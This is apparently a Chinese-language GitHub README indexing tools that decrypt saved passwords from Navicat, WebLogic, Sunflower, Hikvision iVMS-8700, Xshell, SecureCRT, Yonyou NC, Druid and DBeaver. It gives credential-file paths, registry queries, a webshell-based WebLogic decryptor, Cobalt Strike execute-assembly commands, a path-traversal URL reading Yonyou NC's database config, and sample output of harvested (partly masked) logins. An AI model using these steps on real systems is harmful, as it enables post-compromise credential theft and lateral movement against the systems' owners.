# passwd_decrypt_Tools

## navicat_password_decrypt

文件 --> 导出连接--> 选择要导出文件（勾选上密码选项）--> 打开解密软件-->（点我）选择要解密的文件并解密

<img width="560" alt="image" src="https://github.com/lemonlove7/passwd_decrypt_Tools/assets/56328995/19026233-696b-4fdb-97ea-e3faf217e896">
<img width="480" alt="image" src="https://github.com/lemonlove7/passwd_decrypt_Tools/assets/56328995/8f0c37be-2086-4d78-8dcd-3128ccb77fb1">

<img width="742" alt="image" src="https://github.com/lemonlove7/passwd_decrypt_Tools/assets/56328995/fd8de017-151f-4a4d-90dd-9dcf0c2125a8">

## WebLogicPasswordDecryptorUi

https://github.com/Ch1ngg/WebLogicPasswordDecryptorUi

![image](https://github.com/lemonlove7/passwd_decrypt_Tools/assets/56328995/cf36276c-f8a7-45ee-bf91-8e11ff58009f)

PS: 如果遇到密文倒数第二位有斜杠的话，请先删除斜杠再尝试解密。否则可能解密失败

### WeblogicPassword 在线解密(转)

如有webshell可进行在线解密 把weblogicdecryptor.jsp放入服务器进行访问，s="" 中填写 weblogic 的加密密码，可在 boot.properties 文件中找到。默认路径为../../../Server/security/boot.properties

![image](https://github.com/lemonlove7/passwd_decrypt_Tools/assets/56328995/bef259c2-c957-4bba-bf3f-f810837a388c)


## Sunflower_get_Password

https://github.com/wafinfo/Sunflower_get_Password

一款针对向日葵的识别码和验证码提取工具
本工具使用Python3语言开发
```
 pip3 install unicorn
```
### 使用流程介绍

第一步：读取向日葵配置文件路径，分别提取config.ini参数里面encry_pwd(本机验证码)。

fastcode(本机识别码)[注意faskcode值第一个英文字母不要只需要后面数字即可]的值为明文保存所以不需要解密

第二步：把ini参数里面encry_pwd值复制出来本机直接运行SunDecrypt.py输入需要解密encry_pwd值即可输出解密后的值。

向日葵默认配置文件路径:

安装版：C:\Program Files\Oray\SunLogin\SunloginClient\config.ini

便携版(绿色版)：C:\ProgramData\Oray\SunloginClient\config.ini

有些版本密码已经不在配置文件中但是可以通过注册表进行查询,目前解密脚本仍可以用
```
reg query HKEY_USERS\.DEFAULT\Software\Oray\SunLogin\SunloginClient\SunloginInfo

reg query HKEY_USERS\.DEFAULT\Software\Oray\SunLogin\SunloginClient\SunloginGreenInfo
```
![image](https://github.com/lemonlove7/passwd_decrypt_Tools/assets/56328995/b6ecb4f3-03bc-4198-8673-bbfdb35f21ad)


![image](https://github.com/lemonlove7/passwd_decrypt_Tools/assets/56328995/74a40177-98f7-435e-a01c-6a5f22cb6218)

![image](https://github.com/lemonlove7/passwd_decrypt_Tools/assets/56328995/8f37c6cd-6af3-45e5-b0bf-4011c0556a6d)


## 帆软/致远密码解密工具

https://github.com/Rvn0xsy/PassDecode-jar

![image](https://github.com/lemonlove7/passwd_decrypt_Tools/assets/56328995/b9600117-ee9b-4fc8-8dd5-d0ca3007aa7b)

## Hikvision数据库账号解密

### 适用版本
Hikvision ivms-8700

### 使用教程
找到数据库配置文件，如图：
![image](https://github.com/lemonlove7/passwd_decrypt_Tools/assets/56328995/3b2b093c-9366-47db-88e9-fbdb08310f4a)
然后java -jar HikvisionDecode-1.0-SNAPSHOT.jar xxxxx 输入加密的账号和密码，如图:
![image](https://github.com/lemonlove7/passwd_decrypt_Tools/assets/56328995/4f0fe31c-aabf-4efa-b162-bcca09fc266a)


## Xshell_password_decrypt

https://github.com/JDArmy/SharpXDecrypt
### 使用方法
自动寻找session路径
```
C:\Users\asus\Desktop\DEV\SharpXDecrypt\bin\Debug> .\SharpXDecrypt.exe

Xshell全版本凭证一键导出工具!(支持最新Xshell 7系列版本!)
Author: 0pen1
Github: https://github.com/JDArmy
[!] WARNING: For learning purposes only,please delete it within 24 hours after downloading!

[*] Start GetUserPath....
  UserPath: E:\NetSarang Computer\xshell6
  UserPath: C:\Users\asus\Documents\NetSarang Computer\7
[*] Get UserPath Success !

[*] Start GetUserSID....
  Username: asus
  userSID: S-1-5-21-736521517-423******97-1340300005-1001
[*] GetUserSID Success !

  XSHPath: E:\NetSarang Computer\xshell6\Xshell\Sessions\192.168.1.110.xsh
  Host: 192.168.1.110
  UserName: wwwuser
  Password: www*******Aqx
  Version: 6.0

  XSHPath: C:\Users\asus\Documents\NetSarang Computer\7\Xshell\Sessions\192.168.1.110.xsh
  Host: 192.168.1.110
  UserName: wwwuser
  Password: ww********Aqx
  Version: 7.1

  XSHPath: C:\Users\asus\Documents\NetSarang Computer\7\Xshell\Sessions\Tokyo.xsh
  Host: 198.13.51.134
  UserName: root
  Password: W8*********PN__%
  Version: 7.1
```
### 指定session路径
```
C:\Users\asus\Desktop\DEV\SharpXDecrypt\bin\Release> .\SharpXDecrypt.exe "C:\Users\asus\Documents\NetSarang Computer\7\Xshell\Sessions"

Xshell全版本凭证一键导出工具!(支持Xshell 7.0+版本)
Author: 0pen1
Github: https://github.com/JDArmy
[!] WARNING: For learning purposes only,please delete it within 24 hours after downloading!

[*] Start GetUserSID....
  Username: asus
  userSID: S-1-5-21-736521517-4232353097-1340300005-1001
[*] GetUserSID Success !

  XSHPath: C:\Users\asus\Documents\NetSarang Computer\7\Xshell\Sessions\192.168.1.110.xsh
  Host: 192.168.1.110
  UserName: wwwuser
  Password: www*******qx
  Version: 7.1

  XSHPath: C:\Users\asus\Documents\NetSarang Computer\7\Xshell\Sessions\新建会话.xsh
  Host: 127.0.0.1
  UserName: root
  Password: 78******6
  Version: 7.1

[*] read done!
```
### Cobalt Strike
```
execute-assembly /path/to/SharpXDecrypt.exe
execute-assembly /path/to/SharpXDecrypt.exe  "C:\Users\asus\Documents\NetSarang Computer\7\Xshell\Sessions"
```

## SecureCRT产品密码解密
https://github.com/fengchenzxc/SecureCRTdecrypt
SecureCRT批量解密工具 by fengchen
```
python3 securecrtdecryptV2.py -v 2 -p "" -f "/private/tmp/tmp" -s ini

optional arguments:
  -h, --help            show this help message and exit
  -v VERSION, --version VERSION
                        SecureCRT 7.x版本使用-v 1 ，8.x版本使用-v 2，默认为1
  -p CONFIGPASS, --configpass CONFIGPASS
                        v2中需要ConfigPassphrase，v1默认不需要
  -f FILE, --file FILE  Sessions文件夹，设置后会递归查询指定后缀的文件，windows中默认为
                        %APPDATA%\VanDyke\Config\Sessions\sessionname.ini
  -s SUFFIX, --suffix SUFFIX
                        指定后缀，默认为ini
```

## nc_decrypt
```
Java -jar 01-ncDatabase.jar 
[*] 用友nc 数据库密码解密:
[*] 数据库配置文件: /NCFindWeb?service=IPreAlertConfigService&filename=../../ierp/bin/prop.xml
[*] Example: jlehfdffcfmohiag

[+] 请输入加密的数据库密文=
```


## druid-decrypter

druid-decrypter是一款用于解密druid加密过的数据库连接密码的woodpecker插件。目前支持druid < 1.0.16和>= 1.0.16两个版本范围的解密。

woodpecker：https://github.com/woodpecker-framework/woodpecker-framework-release

### 演示
< 1.0.16
![image](https://github.com/lemonlove7/passwd_decrypt_Tools/assets/56328995/50442a31-2e3b-4bd7-b48e-5805541fbc5a)

>= 1.0.16
![image](https://github.com/lemonlove7/passwd_decrypt_Tools/assets/56328995/addd9ee0-dbed-46ee-afd5-47b4117911c9)

## DBeaver-decrypter 
是一款用于解密DBeaver数据库软件保存的密码的 woodpecker 插件

https://github.com/yuyan-sec/DBeaver-decrypter

woodpecker：https://github.com/woodpecker-framework/woodpecker-framework-release

### 演示
Windows 默认配置
```
 密码文件：
 C:\Users\Administrator\AppData\Roaming\DBeaverData\workspace6\General.dbeaver\credentials-config.json

 连接信息：
 C:\Users\Administrator\AppData\Roaming\DBeaverData\workspace6\General.dbeaver\data-sources.json
```
MacOS 默认配置
```
/Users/<hostname>/Library/DBeaverData/workspace6/General/.dbeaver/credentials-config.json
/Users/<hostname>/Library/DBeaverData/workspace6/General/.dbeaver/data-sources.json
```
Linux 默认配置
```
/home/<hostname>/.local/share/DBeaverData/workspace6/General/.dbeaver/credentials-config.json
/home/<hostname>/.local/share/DBeaverData/workspace6/General/.dbeaver/data-sources.json
```
![image](https://github.com/lemonlove7/passwd_decrypt_Tools/assets/56328995/f843638c-6ef3-4dba-9830-09025f645611)







